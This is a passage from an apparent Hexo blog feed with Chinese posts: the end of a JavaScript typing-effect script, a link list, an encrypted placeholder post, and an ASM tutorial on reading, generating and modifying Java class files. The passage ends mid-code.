class="language-javascript"><span class="keyword">var</span> l=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">l.<span class="property">textContent</span>=<span class="title function_">e</span>(),l.<span class="property">style</span>.<span class="property">color</span>=<span class="title function_">t</span>(),n.<span class="title function_">appendChild</span>(l)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">return</span> n;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">i</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> t = o[c.<span class="property">skillI</span>];</span></span><br><span class="line"><span class="language-javascript">c.<span class="property">step</span> ? c.<span class="property">step</span>-- : (c.<span class="property">step</span> = g, c.<span class="property">prefixP</span> &lt; l.<span class="property">length</span> ? (c.<span class="property">prefixP</span> &gt;= <span class="number">0</span> &amp;&amp; (c.<span class="property">text</span> += l[c.<span class="property">prefixP</span>]), c.<span class="property">prefixP</span>++) : <span class="string">&quot;forward&quot;</span> === c.<span class="property">direction</span> ? c.<span class="property">skillP</span> &lt; t.<span class="property">length</span> ? (c.<span class="property">text</span> += t[c.<span class="property">skillP</span>], c.<span class="property">skillP</span>++) : c.<span class="property">delay</span> ? c.<span class="property">delay</span>-- : (c.<span class="property">direction</span> = <span class="string">&quot;backward&quot;</span>, c.<span class="property">delay</span> = a) : c.<span class="property">skillP</span> &gt; <span class="number">0</span> ? (c.<span class="property">text</span> = c.<span class="property">text</span>.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>), c.<span class="property">skillP</span>--) : (c.<span class="property">skillI</span> = (c.<span class="property">skillI</span> + <span class="number">1</span>) % o.<span class="property">length</span>, c.<span class="property">direction</span> = <span class="string">&quot;forward&quot;</span>)), </span></span><br><span class="line"><span class="language-javascript">r.<span class="property">textContent</span> = c.<span class="property">text</span>,</span></span><br><span class="line"><span class="language-javascript">r.<span class="title function_">appendChild</span>(<span class="title function_">n</span>(c.<span class="property">prefixP</span> &lt; l.<span class="property">length</span> ? <span class="title class_">Math</span>.<span class="title function_">min</span>(s, s + c.<span class="property">prefixP</span>) : <span class="title class_">Math</span>.<span class="title function_">min</span>(s, t.<span class="property">length</span> - c.<span class="property">skillP</span>))),</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(i, d)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> l = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">o = [<span class="string">&quot;醒亦念卿，梦亦念卿&quot;</span>,<span class="string">&quot;频繁记录，只因生活和你太值得&quot;</span>,<span class="string">&quot;孜孜不倦，认真且怂&quot;</span>].<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">r</span>) &#123;<span class="keyword">return</span> r + <span class="string">&quot;&quot;</span>&#125;),</span></span><br><span class="line"><span class="language-javascript">a = <span class="number">2</span>,g = <span class="number">1</span>,s = <span class="number">5</span>,d = <span class="number">75</span>,</span></span><br><span class="line"><span class="language-javascript">b = [<span class="string">&quot;rgb(110,64,170)&quot;</span>, <span class="string">&quot;rgb(150,61,179)&quot;</span>, <span class="string">&quot;rgb(191,60,175)&quot;</span>, <span class="string">&quot;rgb(228,65,157)&quot;</span>, <span class="string">&quot;rgb(254,75,131)&quot;</span>, <span class="string">&quot;rgb(255,94,99)&quot;</span>, <span class="string">&quot;rgb(255,120,71)&quot;</span>, <span class="string">&quot;rgb(251,150,51)&quot;</span>, <span class="string">&quot;rgb(226,183,47)&quot;</span>, <span class="string">&quot;rgb(198,214,60)&quot;</span>, <span class="string">&quot;rgb(175,240,91)&quot;</span>, <span class="string">&quot;rgb(127,246,88)&quot;</span>, <span class="string">&quot;rgb(82,246,103)&quot;</span>, <span class="string">&quot;rgb(48,239,130)&quot;</span>, <span class="string">&quot;rgb(29,223,163)&quot;</span>, <span class="string">&quot;rgb(26,199,194)&quot;</span>, <span class="string">&quot;rgb(35,171,216)&quot;</span>, <span class="string">&quot;rgb(54,140,225)&quot;</span>, <span class="string">&quot;rgb(76,110,219)&quot;</span>, <span class="string">&quot;rgb(96,84,200)&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">c = &#123;<span class="attr">text</span>: <span class="string">&quot;&quot;</span>,<span class="attr">prefixP</span>: -s,<span class="attr">skillI</span>: <span class="number">0</span>,<span class="attr">skillP</span>: <span class="number">0</span>,<span class="attr">direction</span>: <span class="string">&quot;forward&quot;</span>,<span class="attr">delay</span>: a,<span class="attr">step</span>: g&#125;;<span class="title function_">i</span>()</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">colortap</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colortap1&#x27;</span>));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;测试PDF&quot;&gt;&lt;a href=&quot;#测试PDF&quot; class=&quot;headerlink&quot; title=&quot;测试PDF&quot;&gt;&lt;/a&gt;测试PDF&lt;/h1&gt;&lt;p&gt; &lt;a href=&quot;测试PDF\CommonsCollections6.pdf&quot;&gt;CommonsCollection</summary>
      
    
    
    
    
    <category term="测试" scheme="http://example.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>有趣的网站分享</title>
    <link href="http://example.com/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/"/>
    <id>http://example.com/2022/11/21/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E5%88%86%E4%BA%AB/</id>
    <published>2022-11-21T13:02:50.000Z</published>
    <updated>2022-11-23T09:16:28.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="有趣网站指南"><a href="#有趣网站指南" class="headerlink" title="有趣网站指南"></a>有趣网站指南</h1><h2 id="编程相关"><a href="#编程相关" class="headerlink" title="编程相关"></a>编程相关</h2><ul><li>每一个程序员都应该知道的网站：<a href="https://github.com">https://github.com</a></li></ul>]]></content>
    
    
    <summary type="html">收集一些有趣的网站</summary>
    
    
    
    
    <category term="有趣的网站" scheme="http://example.com/tags/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>first-page</title>
    <link href="http://example.com/2022/11/19/first-page/"/>
    <id>http://example.com/2022/11/19/first-page/</id>
    <published>2022-11-19T13:16:05.000Z</published>
    <updated>2022-11-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0e4dedf5b31b16ede99027646cfbd77f29f5c78df4cc27d088ac4f3dc1318fce"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">听说只有管理员才可以查看哦</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">fist-page肯定是测试用的啦，第一次都是他的，需要测试的都给他第一时间内安排。</summary>
    
    
    
    
    <category term="Test" scheme="http://example.com/tags/Test/"/>
    
  </entry>
  
  <entry>
    <title>asm</title>
    <link href="http://example.com/2022/11/19/asm/"/>
    <id>http://example.com/2022/11/19/asm/</id>
    <published>2022-11-19T12:08:37.664Z</published>
    <updated>2022-11-23T08:40:31.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 